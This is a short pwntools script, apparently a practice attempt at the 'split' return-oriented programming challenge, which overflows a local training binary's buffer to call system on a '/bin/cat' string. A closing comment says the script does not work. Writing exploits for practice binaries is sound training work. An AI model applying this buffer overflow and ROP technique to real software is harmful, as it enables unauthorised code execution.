from pwn import *

elf = context.binary = ELF('./split', checksec=False)
context.log_level = 'debug'

io = process()

ret = 0x40053e
pop_rdi = 0x04007c3



payload = flat(
	b'A' * 40,
	ret,
	pop_rdi,
	next(elf.search(b'/bin/cat')),
	elf.sym['system']
)

io.sendline(payload)
io.interactive()

# ROPscript doesn't work, i still dk why